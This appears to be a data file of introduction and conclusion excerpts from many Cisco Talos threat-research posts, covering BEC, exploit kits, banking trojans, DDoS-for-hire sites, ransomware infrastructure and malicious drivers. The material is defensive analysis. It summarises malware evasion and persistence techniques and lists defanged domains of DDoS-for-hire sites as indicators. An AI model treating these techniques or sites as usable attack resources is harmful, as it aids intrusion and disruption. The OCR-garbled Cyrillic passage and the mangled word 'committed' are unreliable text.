far from the complete picture of what threats organizations face. One of the most, if not the most, costly is something far less sophisticated: Business Email Compromise (BEC). BEC can take a wide array of different forms, but its goal is relatively simple - trick an unsuspecting user into giving them something. Lately, we've seen a recent rise in these types of attacks, with adversaries still using COVID-19 as a major topic of lures to draw unsuspecting victims into turning over important personal and financial information. \nLooking at conservative estimates, business email compromise losses are in the billions, with the FBI stating in 2020 alone the loses approached \\$1.8 Billion. This is an extremely lucrative enterprise with a low barrier to entry. Other forms of cybercrime are tougher to enter because the actor needs to source the malware they are going to distribute and have enough knowledge to set up and run the associated infrastructure - or at the very least, pay someone who does. At the very least, this takes a significant amount of time and effort, where BEC removes the majority of those barriers. \nBusiness Email Compromise starts as a lot of cybercrime does, with an email. These emails can vary widely in content or in design, but they are almost always spoofed to look like they are coming from someone important. The other common thing is they will almost always ask for some type of assistance. The type of request varies widely, as we'll demonstrate throughout this blog, but the resulting ask is always financial in nature and will require the recipient to purchase something or wire funds somewhere. So let's walk through some examples of what we've seen over the past year. ", "source": "Cisco"}, {"title": "Conclusion", "content": "There is no silver bullet or one-size-fits-all solution for BEC. It's going to take a combination of technology and human capital to defeat this threat. One final note on that - if you do have a user that stops these types of campaigns, reward them. They have saved your company a lot of potential loss, and by reinforcing the behavior, hopefully more employees will be willing to step up and stop these types of attacks from occurring. The problem of Business Email Compromise isn't going away and as we get better and better at stopping malware from running and exploitation from being successful, it's only going to get significantly worse. \nThis post contains basic and sophisticated examples of BEC and shows that they can be extremely effective. Most estimates have the revenue generated from BEC in the billions, and although a lot of attention gets paid to more destructive and aggressive threats like big game hunting, it's BEC that generates astronomical revenue without much of the law enforcement attention these other groups have to contend with. If anything, the likelihood of this has only increased in the pandemic, with people relying more and more on digital communication. The reality is these types of emails and requests happen legitimately all over the world everyday, which is what makes this such a challenge to stop. \nCoverage \nWays our customers can detect and block this threat are listed below. \nCisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Nick Biasini, Vitor Ventura \nTUESDAY, FEBRUARY 22, 2022 08:00 \nEditor's note: This post is the first in a new series from Talos looking at high-level topics across the cybersecurity space. Our researchers rely on years of expertise, data, and tremendous visibility; applying what we can learn from history, research, and analysis to nascent security challenges. Please lookout for more \"On the Radar\" posts in the future. \nThe cyber world today is chaotic, as the continual escalation in malicious activities from statesponsored actors and criminal organizations has made being a defender an increasingly difficult task. Complicating matters is the ongoing COVID-19 pandemic, now entering its third year, that is completely shifting the ways we work. But we're defenders, so we're used to impossible odds and long hours of fighting the good fight, it's time we leverage the work shift to even the playing field a bit. \nThe pandemic and associated hybrid work shift haven't just introduced new challenges they've exacerbated the problems we already face. For example, the stressed-out worker that falls for the COVID-19 themed lure that leads to a ransomware attack. The development teams that are tasked with remediating vulnerabilities that lose access to key tools and resources when working remotely. Even the employee at a software vendor that doesn't have adequate security protections when outside the office, facilitates a compromise that results in a supply chain attack. These are just a few of the countless scenarios that organizations are now facing. The shift to a permanent hybrid work environment is going to require new architectures to be built and existing architectures to be overhauled - providing an opportunity to secure it for the threats we face. The supply chain is being attacked by groups that are both state-backed and financially motivated, both known and unknown vulnerabilities continue to affect the industry, and statesponsored actors continue to escalate while criminal cartels have taken over the multi-billion dollar crimeware industry. In short, it looks a little bleak. ", "source": "Cisco"}, {"title": "Conclusion", "content": "If the last few years have taught us anything, it's that we're bad at predicting the future. We went through a decade of mobile threats being the next big thing before we really saw state-sponsored actors increase their activity. What we can see are the trends that have emerged, and there are some concerning indicators. Today, it's not just state-sponsored actors leveraging zero-days and compromising service providers. The APT space is filled with new combatants that haven't spent the last 10 to 20 years learning the hard lessons and building robust capabilities. This has led to more risky behavior than we've seen historically, without as much regard for collateral damage, as evidenced in Sea Turtle's targeting of DNS. \nWhat was once a space reserved for espionage has now broadened its targeting to include dissidents and activists as much as the nations that threaten their borders or interests. These attacks have also included destructive and disruptive elements instead of pure espionage. \nCombine that with a criminal enterprise making billions of dollars annually, leveraging a monetization capability that never existed in the past with cryptocurrencies. We've never faced more challenges as defenders, but there are potential solutions. Begin looking at the technologies that are going to make the most impact: implement MFA, start the move toward zero trust, and build the security fundamentals you need to succeed. The next several years are likely to be tough, with the legal and governmental actions necessary to thwart these activities lagging \nbehind. However, the pandemic has forced an unprecedented shift in working behaviors and, with it, new opportunities to reconsider our approach to security. \nSHARE THIS POST ", "source": "Cisco"}, {"title": "Introduction", "content": "By Alexander Chiu \nMONDAY, MAY 4, 2015 04:00 \nTHREAT SPOTLIGHT\nThis post was authored by Ben Baker and Alex Chiu. \nExecutive Summary \nThreat actors and security researchers are constantly looking for ways to better detect and evade each other.  As researchers have become more adept and efficient at malware analysis, malware authors have made an effort to build more evasive samples.  Better static, dynamic, and automated analysis tools have made it more difficult for attackers to remain undetected. As a result, attackers have been forced to find methods to evade these tools and complicate both static and dynamic analysis. \nIt becomes critical for researchers to reverse engineer evasive samples to find out how attackers are attempting to evade analysis tools. It is also important for researchers to communicate how the threat landscape is evolving to ensure that these same tools remain effective. A recent example of these behaviors is a malware sample Talos has identified as Rombertik. In the process of reverse engineering Rombertik, Talos discovered multiple layers of obfuscation and anti-analysis functionality. This functionality was designed to evade both static and dynamic analysis tools, make debugging difficult. If the sample detected it was being analyzed or debugged it would ultimately destroy the master boot record (MBR). \nTalos' goal is to protect our customer's networks.  Reverse engineering Romberik helps Talos achieve that goal by better understanding how attackers are evolving to evade detection and make analysis difficult. Identifying these techniques gives Talos new insight and knowledge that can be communicated to Cisco's product teams.  This knowledge can then be used to harden our security products to ensure these anti-analysis techniques are ineffective and allow detection technologies to accurately identify malware to protect customers. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Rombertik is a complex piece of malware with several layers of obfuscation and anti-analysis functionality that is ultimately designed to steal user data.  Good security practices, such as making sure anti-virus software is installed and kept up-to-date, not clicking on attachments from unknown senders, and ensuring robust security policies are in place for email (such as blocking certain attachment types) can go a long way when it comes to protecting users.  However, a defense in depth approach that covers the entire attack continuum can help identify malware and assist in remediation in the event that an attacker finds a way to evade detection initially. \nFor Talos, understanding how malware changes and evolves is essential to developing detection content and ensuring that static, dynamic, and automated analysis tools remain effective. We must adapt, change, and respond accordingly to address the evolving threat landscape. Looking forward, Talos expects these methods and behaviors to be adopted by other threat actors in the future. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Nick Biasini, Edmund Brumaghin \nTHURSDAY, FEBRUARY 13, 2020 14:07 \nTHREAT SPOTLIGHT\nCoronavirus is dominating the news and threat actors are taking advantage. Cisco Talos has found multiple malware families being distributed with Coronavirus lures and themes. This includes emotet and several RAT variants. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Malicious actors are always going to do whatever they can to increase infection rates and in turn increase revenue, this includes using the news and fear to achieve their goals. This is one of the cases where both news and fear can be used. In a world where threats like Emotet are stealing emails and replying in-line users need to be increasingly skeptical of all attachments regardless of source. These attacks can be seen in an email thread with a colleague or friend and, in some cases, may come directly from that colleague or friend. Additionally, anything news related should be treated with a little extra skepticism, go out and do your own research instead of just clicking links and opening documents that are sent your way. \nCoverage \nWays our customers can detect and block this threat are listed below. \nAdvanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware detailed in this post. Below is a screenshot showing how AMP can protect customers from this threat. Try AMP for free here. \nCisco Cloud Web Security (CWS) or Web Security Appliance (WSA) web scanning prevents access to malicious websites and detects malware used in these attacks. \nEmail Security can block malicious emails sent by threat actors as part of their campaign. \nNetwork Security appliances such as Next-Generation Firewall (NGFW), Next-Generation Intrusion Prevention System (NGIPS), Cisco ISR, and Meraki MX can detect malicious activity associated with this threat. \nThreat Grid helps identify malicious binaries and build protection into all Cisco Security products. \nUmbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network. \nAdditional protections with context to your specific environment and threat data are available from the Firepower Management Center. \nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. \nIndicators of Compromise (IOC) \nHashes (SHA256) ", "source": "Cisco"}, {"title": "Introduction", "content": "Today, Cisco Talos is disclosing several vulnerabilities in MacPaw's CleanMyMac X software. CleanMyMac X is a cleanup application for Mac operating systems that allows users to free up extra space on their machines by scanning for unused or unnecessary files and deleting them. In all of these bugs, an attacker with local access to the victim machine could modify the file system as root. \nIn accordance with our coordinated disclosure policy, Cisco Talos worked with MacPaw to ensure that these issues are resolved and that an update is available for affected customers. ", "source": "Cisco"}, {"title": "Conclusion", "content": "It is recommended that users update to the latest version of this software (CleanMyMac X version 4.2.0). There are several ways in which an attacker could bypass the usual protections in place to acquire greater access to the machine and modify the file system as root. ", "source": "Cisco"}, {"title": "Introduction", "content": "By William Largent \nTUESDAY, AUGUST 15, 2017 13:14 \nThis post was authored by Dave Liebenberg \nIn the past few months, Talos has observed an uptick in the number of Chinese websites offering online DDoS services. Many of these websites have a nearly identical layout and design, offering a simple interface in which the user selects a target's host, port, attack method, and duration of attack. In addition, the majority of these sites have been registered within the past six months. \nHowever, the websites operate under different group names and have different registrants. In addition, Talos has observed administrators of these websites launching attacks on one another. Talos sought to research the actors responsible for creating these platforms and analyze why they have become more prevalent lately. \nIn this blog post, we will begin by looking at the DDoS industry in China and charting the shift toward online DDoS platforms. Then we will examine the types of DDoS platforms created recently, noting their similarities and differences. Finally, we will look into the source code likely responsible for the recent increase in these nearly identical DDoS websites. ", "source": "Cisco"}, {"title": "Conclusion", "content": "The recent uptick in Chinese online DDoS platforms seems to be connected to source code for sale on Chinese hacker forums. This source code appears to be a localized version of code originally written for English language online booters. \nOnline DDoS platforms remain popular because of their easy-to-use interfaces and the fact that they already provide all necessary infrastructure to the user, so there is no need to build a botnet or purchase additional services. Instead, the user purchases an activation code through a trusted payment site and then simply enters in their target. This serves the function of enabling even the most novice of actors the capability to launch powerful attacks, depending on the strength of the DDoS group's backend infrastructure. \nTalos will continue to monitor Chinese hacker forums and group chats for newly-created online Chinese DDoS platforms as well as greater trends emerging in the Chinese DDoS industry. \nIOCs: Online DDoS Websites www[.]794ddos[.]cn www[.]dk.ps88[.]org www[.]tmddos[.]top www[.]wm-ddos[.]win www[.]tc4[.]pw www[.]hkddos[.]cn www[.]ppddos[.]club www[.]lnddos[.]cn www[.]711ddos[.]cn www[.]830ddos[.]top www[.]bbddos[.]com www[.]941ddos[.]club www[.]123ddos[.]net www[.]the-dos[.]com \nwww[.]etddos[.]cn   \nwww[.]jtddos[.]me   \nwww[.]ccddos[.]ml   \nwww[.]87ddos[.]cc   \nwww[.]ddos[.]cx   \nwww[.]hackdd[.]cn   \nwww[.]shashenddos[.]club   \nwww[.]minddos[.]club   \nwww[.]caihongtangddos[.]cn   \nwww[.]zfxcb[.]top   \nwww[.]91moyu[.]top   \nwww[.]xcbzy[.]club   \nwww[.]this-ddos[.]cn   \nwww[.]aaajb[.]top   \nwww[.]ddos[.]qv5[.]pw   \nwww[.]tdddos[.]com   \nwww[.]ddos[.]blue ", "source": "Cisco"}, {"title": "Introduction", "content": "By Nick Biasini, Erick Galinkin, Alex McDonnell \nWEDNESDAY, APRIL 20, 2016 12:04\nTHREAT SPOTLIGHT\nTalos is constantly monitoring the threat landscape and exploit kits are a constantly evolving component of it. An ongoing goal of Talos is to expose and disrupt these kits to protect the average internet user being targeted and compromised. We were able to gain unprecedented insight into Angler exploit kit and reveal details of the activity that were previously unknown. Now we have focused our attention on the Nuclear exploit kit with similar results. \nNuclear exploit kit has been steadily compromising users for years and has been effective in evolving as well as adding new exploits to their arsenal. However, it has been operating largely off the radar compared to some of the more prolific kits that are active today. This lack of deep visibility was one of the driving forces behind the deep investigation into its activity. What we found was a sophisticated threat that has been successfully targeting and compromising users in more than 10,000 different cities in more than 150 countries. \nWe continued digging through our data and wound up with a list of 10-15 IP's that were hosting the Nuclear EK. This allowed us to focus on the providers hosting the activity. At this point the first key piece was identified: DigitalOcean. We were able to determine that practically all the Nuclear activity we were tracking was being hosted by DigitalOcean. Talos established contact with DigitalOcean and notified them of the activity and the details associated with the threat. DigitalOcean's security team validated the malicious nature of the hosts and collaborated with Talos to provide valuable intel, during the take down, to help expose how the kit operates. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Exploit kits are constantly active, evolving, and compromising users. Talos is $\\mathbf{\\widetilde{e}}\\mathbf{\\widetilde{e}}$ mmitted to not only protecting our users by developing content to block these threats, but to exposing how they operate and working with providers to eliminate them from the threat landscape. As we've seen in the past the relationship between threat researchers and hosting providers is key to this success. This is another example of how a willing provider can help expose the activities of the adversaries and in turn hopefully discourage them from being leveraged for this type of behavior in the future. \nProject Aspis was created specifically for this function. To those hosting providers that are in a position to help please don't hesitate to reach out to us at Talos. Whether there is a threat in your environment currently or not, we are always looking to foster these relationships. It's this type of industry cooperation that is key to helping prevent this type of threat from affecting people around the globe. \nThis research marks an interesting change in exploit kit behavior in a move towards more targeted compromise. As researchers have continued to pick apart the exploit kits as they operate inside the US/UK, the adversaries are evolving. This is similar to the same way they evolve the kit itself as we build protections against the kits themselves. This particular Nuclear actor focused its efforts on non-English countries to avoid the competition and visibility associated with attacking those users. Obviously it's impossible to avoid victims in these countries, but by focusing their efforts on non-English speaking users they appeared to have increased their elusiveness. \nAs long as adversaries are using these kits to compromise users we will remain vigilant in hunting down the activity, protecting our users, as well as exposing the activity to the world. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Cisco Talos \nTUESDAY, JUNE 20, 2017 13:22 \nANNOUNCEMENTS \nBy Sean Baird, with contributions by Doug Sibley and Yuxi Pan. \nFor the past several months, the problem of \"fake news\" has been abuzz in news headlines, tweets, and social media posts across the web. With historical roots in information warfare and disinformation, \"fake news\" is a different kind of cyber-threat affecting people all around the globe. Using advanced machine learning and artificial intelligence technology, Talos researchers set their sights on this different kind of cyber-threat and beat out over 80 registered teams worldwide to claim first place in the Fake News Challenge. ", "source": "Cisco"}, {"title": "Background", "content": "While there has been significant media coverage regarding fake news in recent months, the modern fake news problem is rooted in a long history of information operations and disinformation campaigns. \nIn a very in-depth paper about the topic, Facebook defines information operations \"[...] as actions taken by organized actors...to distort domestic or foreign political sentiment, most frequently to achieve a strategic and/or geopolitical outcome [...]\" and classifies \"false news\" as a useful tool in the information operations toolkit. The paper specifies that \"false news\" is \"[...] news articles that purport to be factual, but which contain intentional misstatements of fact with the intention to arouse passions, attract viewership, or deceive.\" \nAlternately, the Wired article announcing the victory describes fake news in a simpler manner as \"[...] made-up news stories created to convert social media shares into page views, ad dollars, and perhaps even political traction.\" \nClearly, this is a difficult problem to solve in cyberspace, especially in a world where technology and social media can help amplify these stories to a much broader audience. This prompted several researchers in academia and industry to create the Fake News Challenge (FNC). The self described goal of the FNC is to \"[...] address the problem of fake news by organizing a competition to foster development of tools to help human fact checkers identify hoaxes and deliberate misinformation in news stories.\" \nThe first iteration of the challenge (FNC-1), which lasted from December 1, 2016 until June 2, 2017 focused solely on stance detection, a crucial first step in helping to detect fake news. ", "source": "Cisco"}, {"title": "Detection", "content": "While actual truth-labeling is a hefty task, rife with political and technical issues, stance detection is a potential first step toward a more robust solution. Dean Pomerleau, one of the organizers of the challenge, explained in a Mediashift interview that \"[...] the goal [of stance detection] is to determine which has the best argument, not just which is the most popular or widely cited or read, the way a search engine does.\" \nIn the context of the FNC, stance detection can be defined as labeling the relationship an article body has to its headline/claim \u2013 specifically, whether the body agrees with, disagrees with, or discusses the headline/claim or whether the body is completely unrelated. Thus, the four possible outputs of a stance detection system should be \"agree,\" \"disagree,\" \"discuss,\" and \"unrelated.\" An example of how stance detection could be implemented in a broader fake news detection system is available in the figure below: \nAlways interested in a challenge, the FNC piqued the interest of Talos researchers who chose the team name \"SOLAT IN THE SWEN\" as a clever anagram of their true affiliation. Immediately, these researchers began development work on various models and solutions in their spare time -- models which would eventually net them a first place victory. \nSOLAT IN THE SWEN - Talos's covert team name ", "source": "Cisco"}, {"title": "Conclusion", "content": "In the end, these innovative model implementations put Talos on top of the global leaderboard. While more research needs to be done, Talos's award-winning research on stance detection is an important first step toward tackling the problem of fake news and disinformation in the 21st century. \nAs the Fake News Challenge moves forward and the natural language processing community continues to churn out cutting-edge research, Talos remains committed to continually forcing the bad guys to innovate. ", "source": "Cisco"}, {"title": "Introduction", "content": "Gozi ISFB is a well-known and widely distributed banking trojan, and has been in the threat landscape for the past several years. Banking trojans are a type of malware that attackers leverage in an attempt to obtain banking credentials from customers of various financial institutions. The source code associated with Gozi ISFB has been leaked several times over the years, and the robust features available within the Gozi ISFB code base have since been integrated into additional malware, such as GozNym. Talos published detailed research about GozNym in a September 2016 blog post. Since then, Talos has been monitoring Gozi ISFB activity, and has discovered a series of campaigns over the past six month that have been making use of the elusive \"Dark Cloud\" botnet for distribution. In investigating the infrastructure associated with Dark Cloud, we identified a significant amount of malicious activity making use of this same infrastructure, including Gozi ISFB distribution, Nymaim command and control, and a variety of different spam campaigns and scam activity. Talos is publishing details related to ongoing Gozi ISFB activity, the Dark Cloud botnet, as well as the additional threats we have observed using this infrastructure over the past couple of years. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Gozi ISFB is a banking trojan that has been used extensively by attackers who are targeting organizations around the world. It has been around for the past several years, and ongoing campaigns indicate that it will not be going away any time soon. Attackers are continuing to modify their techniques and finding effective new ways to obfuscate their malicious server infrastructure in an attempt to make analysis and tracking more difficult. Talos has identified the Dark Cloud botnet being used for a multitude of malicious purposes. We will continue to monitor these threats as they continue to evolve over time to ensure that customers remain protected and the public is informed with regards to continued use of threats such as Gozi ISFB, Nymaim and others. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Asheer Malhotra \nWEDNESDAY, APRIL 29, 2020 11:48\nCisco Talos has observed an upgraded version of a malspam campaign known to distribute multiple remote access trojans (RATs).   \nThe infection chain utilized in the attacks is highly modularized.   \nThe attackers utilize publicly available infrastructure such as Bitly and Pastebin (spread over   \na number of accounts) to direct and host their attack components. Network-based detection, although important, should be combined with endpoint protections to combat this threat and provide multiple layers of security. ", "source": "Cisco"}, {"title": "Conclusion", "content": "The actors behind this campaign are clearly motivated and continue to operate leveraging freely available infrastructure such as Pastebin, Bitly (j[.]mp) and others. We have also observed a steady evolution in their tactics ranging from modularization of their attack chains to antivirus evasion tactics to thwart detections. The fact that these actors continue to distribute a wide variety of malware indicates that they are constantly growing their malware arsenal. The campaign started in January 2020 and is still ongoing. This campaign also shows us that while network-based detection is important, it must be complemented with system behavior analysis and endpoint protections. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Edmund Brumaghin, Colin Grady, David Maynor \nWEDNESDAY, OCTOBER 11, 2017 12:11\nThis post was authored by Edmund Brumaghin, Colin Grady, with contributions from Dave Maynor and @Simpo13. \nExecutive Summary \nCisco Talos previously published research into a targeted attack that leveraged an interesting infection process using DNS TXT records to create a bidirectional command and control (C2) channel. Using this channel, the attackers were able to directly interact with the Windows Command Processor using the contents of DNS TXT record queries and the associated responses generated on the attacker-controlled DNS server. \nWe have since observed additional attacks leveraging this type of malware attempting to infect several target organizations. These attacks began with a targeted spear phishing email to initiate the malware infections and also leveraged compromised U.S. state government servers to host malicious code used in later stages of the malware infection chain. The spear phishing emails were spoofed to make them appear as if they were sent by the Securities and Exchange Commission (SEC) in an attempt to add a level of legitimacy and convince users to open them. The organizations targeted in this latest malware campaign were similar to those targeted during previous DNSMessenger campaigns. These attacks were highly targeted in nature, the use of obfuscation as well as the presence of a complex multi-stage infection process indicates that this is a sophisticated and highly motivated threat actor that is continuing to operate. ", "source": "Cisco"}, {"title": "Conclusion", "content": "This attack shows the level of sophistication that is associated with threats facing organizations today. Attackers often employ multiple layers of obfuscation in an attempt to make analysis more difficult, evade detection and prevention capabilities, and continue to operate under the radar by limiting their attacks to only the organizations that they are targeting. It is also important for organizations to be aware of some of the more interesting techniques that malware is using to execute malicious code on systems and gain persistence on systems once they are infected. In this particular case, the malware featured the capability to leverage WMI, ADS, scheduled tasks, as well as registry keys to obtain persistence. The use of DNS as a conveyance for later stage code and C2 communications is also becoming more and more commonplace. Talos continues to monitor the threat landscape for unique and targeted attacks such as this one so that customers remain protected as attackers change the techniques they use to perform their malicious activities. ", "source": "Cisco"}, {"title": "Introduction", "content": "B Nick Biasini \nMONDAY, MARCH 21, 2016 11:06 \nThis post authored by Steve Poulson with contributions from Nick Biasini. \nExploit kits are constantly evolving and changing. We recently wrote about some subtle Angler changes but then Angler changed drastically on March 8. In this blog post, we will briefly cover these changes, examining different characteristics of the URL structure for Angler and the origins of the words being leveraged to create them. ", "source": "Cisco"}, {"title": "Conclusion", "content": "We conclude that corncob.dict is a likely candidate for the source of words used by the Angler URL generation code because all the words seen in the URLs are found in that dictionary, even the obscure ones, and the distribution of lengths and starting letters are very close. Additionally, corncob has the fewest words which means finding all 1776 words in the URLs by chance is unlikely. This insight may lead to better detection and may also explain the source of some of the other generated words seen in Angler traffic. It also offers a technique to identifying the generation mechanisms in other traffic such as DGAs. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Matt Olney \nTUESDAY, APRIL 18, 2023 11:02 \nTHREATS SECUREX THREAT ADVISORY \nCisco is deeply concerned by an increase in the rate of high-sophistication attacks on network infrastructure - that we have observed and have seen corroborated by numerous reports issued by various intelligence organizations - indicating state-sponsored actors are targeting routers and firewalls globally. We have spoken about infrastructure security for a long time. However, \nwhile working with network infrastructure in various parts of the world, we have observed both espionage and obvious targeting to support future destructive attacks. While working with our partners, we have experienced the operational barriers that slow and sometimes stop security teams from properly securing network infrastructure. In this report, we are sharing both our observations of top-tier attackers and their activities on network devices, and recommendations and resources to help you improve your network infrastructure resilience. ", "source": "Cisco"}, {"title": "Background", "content": "Recently, the UK's National Cyber Security Centre (NCSC) released a report on a sustained campaign by a Russian intelligence agency targeting a vulnerability in routers that Cisco had published a patch for in 2017. This campaign, dubbed \"Jaguar Tooth,\" is an example of a much broader trend of sophisticated adversaries targeting networking infrastructure to advance espionage objectives or pre-position for future destructive activity. While infrastructure of all types has been observed under attack, attackers have been particularly successful in compromising infrastructure with out-of-date software. \nBecause of the large presence of Cisco network infrastructure around the world, any sustained attack against network infrastructure would likely target Cisco equipment, but attacks are by no means limited to Cisco hardware. In reporting on Russian intelligence contracting documents, samples of which were recently shared with Cisco Talos, it was shown that any infrastructure brand would be targeted, with one scanning component targeting almost 20 different router and switch manufacturers (see the image below). Looking at past research, in 2018 Talos looked into the VPNFilter threat, also believed to be of Russian origin, which showed a well-developed capability targeting Asus, Huawei, Linksys, MikroTik, Netgear, QNAP, TP-LINK, Ubiquiti, and Upvel devices. \n00opyIOBaHHa, IpeICTaBJAIOT CJeIyIOHe KIaccbI IpOM3BOJNTeJei: CiscO, Huawei, Juniper, a Takke 3Com, Alcatel, Allied Telesis, Avaya, D-Link, Extreme Networks, HP, Linksys, MikroTik, Motorola, MOXA, Netgear, Nortel, Ubiquiti, Wind River, ZyXEL. TH KIacCHI  JOIKHBI HIbTpOBaTbCA CIO APM TeCTHpOBaHHA TeIeKOMMyHHKaLHOHHOrO OOopyIOBaHHA B BHIBOIe nmap H OTOOpaKaTLCA B HHTep\u4e2deice Onleparopa. \nRussia is not alone in its actions. CISA has reported on Chinese adversaries targeting network equipment from a similarly broad set of manufacturers. These are certainly not the only campaigns targeting network equipment, nor the only actors. It is reasonable to conclude that ", "source": "Cisco"}, {"title": "Conclusion", "content": "If your network isn't secure, then nothing on that network can be properly secured. We know that there is a myriad of operational realities that make it difficult to maintain a fully defensible network infrastructure. However, given the risks and outcomes that compromised network infrastructure bring, these obstacles must be overcome for organizations to truly secure their environment. Regardless of the context, aging infrastructure is a risk. Relying on out-of-date gear or utilizing out-of-date protocols and technologies will eventually cost your organization. Work with your vendor to give yourself the best chance of defending your environment. \nAbusing with style: Leveraging cascading style sheets for evasion and tracking M A R C H 1 3 , 2 0 2 5 0 6 : 0 0 \nCascading Style Sheets (CSS) are ever present in modern day web browsing, however its far from their own use. This blog will detail the ways adversaries use CSS in email campaigns for evasion and tracking. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Craig Williams \nTUESDAY, NOVEMBER 18, 2014 04:03 \nTHREATS \nThis post was authored by Dave McDaniel with contributions from Jaeson Schultz. \nRecently, we came across a malware sample that has been traversing the Internet disguised as an image of a woman. The malware sample uses several layers of obfuscation to hide its payload, including the use of steganography. Steganography is the practice of concealing a message, image, or file within another message, image, or file. Steganography can be used in situations where encryption might bring unwanted attention. Encrypted traffic from an unusual source is going to draw unwanted attention. Steganography allows malicious payloads to hide in plain sight. It also allows the attacker to bypass security devices. In our sample malware, steganography is used to decrypt and execute a second dropper, which in turn installs a user-land rootkit to further hide its intentions. The rootkit adds another layer of obfuscation by installing a DarkComet backdoor, using RC4 encryption to encrypt its configuration settings and send data to its command and control server. ", "source": "Cisco"}, {"title": "Conclusion", "content": "In researching this malware we noted several layers and techniques to hide its payload, including steganography to decrypt/execute a second dropper (a malicious binary who's purpose is to download/install additional malicious programs), a userland rootkit, a DarkComet backdoor with RC4 encryption, and Dynamic DNS for C&C traffic. Attackers will continue to employ these kinds of obfuscation techniques in an attempt to avoid detection as well as making it more difficult to reverse engineer. Network administrators will need to remain vigilant with timely signature updates to their security devices to ensure coverage and protection against these more research intensive techniques. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Paul Eubanks \nTUESDAY, JUNE 28, 2022 08:00\nRANSOMWARE FEATURES \nWe have developed three techniques to identify ransomware operators' dark websites hosted on public IP addresses, allowing us to uncover previously unknown infrastructure for the DarkAngels, Snatch, Quantum and Nokoyawa ransomware groups. \nThe methods we used to identify the public internet IPs involved matching threat actors' TLS certificate serial numbers and page elements with those indexed on the public internet, as well as taking advantage of ransomware operators' security failures. \nIn de-anonymizing the dark web infrastructure used by ransomware actors, we can enable hosting providers to reduce illegal activity on their networks, enhance threat actor tracking, assist in possible law enforcement investigations, and/or slow ransomware operations as they make operational changes. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Through various methods we've demonstrated, we can see ransomware operators take many precautions to obscure their true identity online, as well as the hosting location of their web server infrastructure. They use the TOR network to provide a layer of anonymity for their web servers. They use DNS proxy registration services to keep their names off of the domain names they register. In our experience, we find that most ransomware operators use hosting providers outside their country of origin (such as Sweden, Germany and Singapore) to host their ransomware operations sites. They use VPS hop-points as a proxy to hide their true location when they connect to their ransomware web infrastructure for remote administration tasks. By exposing some of these techniques, we can gain knowledge about the tools and procedures these groups rely on to cloak their true identities, as well as build a better understanding of how these groups operate. \nRELATED CONTENT \nIntroducing ToyMaker, an initial access broker working in cahoots with double extortion gangs \nA P R I L 2 3 , 2 0 2 5 0 6 : 0 0 \nCisco Talos discovered a sophisticated attack on critical infrastructure by ToyMaker and Cactus, using the LAGTOY backdoor to orchestrate a relentless double extortion scheme. \nUnwrapping the emerging Interlock ransomware attack \nN OV E M B E R 7 , 2 0 2 4 0 6 : 0 0 \nCisco Talos Incident Response (Talos IR) recently observed an attacker conducting big-game hunting and double extortion attacks using the relatively new Interlock ransomware. ", "source": "Cisco"}, {"title": "Introduction", "content": "https://blog.talosintelligence.com/neurevt-trojan-takes-aim-at-mexican/ \nCisco Talos discovered a new version of the Neurevt trojan with spyware and backdoor capabilities in June 2021 using Cisco Secure Endpoint product telemetry. This version of Neurevt appears to target users of Mexican financial institutions. This threat demonstrates several techniques of the MITRE ATT&CK framework, most notably T1547 \u2013 Boot or Login Autostart Execution, T1055 - Process Injection, T1546 - EventTriggered Execution, T1056 - Credential API Hooking, T1553 \u2013 Subvert Trust Controls, T1562 \u2013 Impair Defences, T1112 \u2013 Modify Registry, T1497 \u2013 Virtualization\\Sandbox Evasion, T1083 - File and directory discovery, T1120 - Peripheral device discovery, T1057 - Process Discovery, T1012 - Query Registry, T1518 - Software Discovery and T1082 - System Information Discovery. Cisco Secure Endpoint, SNORT\u24c7 and Cisco Umbrella can all protect users from downloading this malware, protecting their online banking accounts from potential theft. ", "source": "Cisco"}, {"title": "Conclusion", "content": "This version of Neurevt exhibited multiple functionalities. Once infected, the attacker gains access to the victim's system and modifies their system settings to conceal their existence. The trojan will access the victim's system service tokens and elevate its privilege, thereby accessing the operating system, user's account information, credentials of banking websites, capture screenshots, and connecting to the C2 servers to steal intellectual property and personal information.This trojan could affect individual users and organizations leading to a data breach, or reputational damage that eventually results in a loss of financial value. \nOrganizations and defenders can take proactive measures to mitigate the risk of infection and data theft, such as restricting users accessing suspicious websites and downloading malicious contents. Talos also encourages implementation of role-based access control for the use of \nWindows administrative tools, PowerShell execution policy and block suspicious IP addresses, domains and network traffic from C2.   \nIndividuals using their personal systems must ensure they have the latest updates installed, including anti-virus scan engines, operating systems and applications. Automatic execution of browser scripts should be disabled. Users should be careful while accessing websites that download their contents to their computer's file system. \nHigh level overview of Neurevt execution flow. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Vanja Svajcer, James Nutland, Nicole Hoffman, Chris Neal \nTHURSDAY, DECEMBER 19, 2024 06:04 \nTHREATS VULNERABILITY DRIVERS \nThis post is the result of research into the real-world application of the Bring Your Own Vulnerable Driver (BYOVD) technique along with Cisco Talos' series of posts about  malicious Windows drivers. Some of this research was presented at the AVAR conference in Chennai at the beginning of December 2024. ", "source": "Cisco"}, {"title": "Conclusion", "content": "In recent years, Windows platform security has improved to effectively prevent deployment of newly developed malicious drivers. However, kernel mode threats of vulnerable legacy drivers remain a concern. Luckily there are a few things we can do to mitigate the risks and detect potential campaigns using BYOVD technique. \nThis could include enforcement of Extended Validation (EV) and Windows Hardware Quality Labs (WHQL) certified drivers, preventing risks associated with legacy drivers. If the blocking of all legacy drivers is not possible, employing the Windows Defender Application Control (Windows Security) drivers blocklist is recommended way to prevent the execution of known vulnerable drivers. \nApart from the above, for threat detection and response, it recommended to develop a capability to monitor driver load events, such as those recorded by 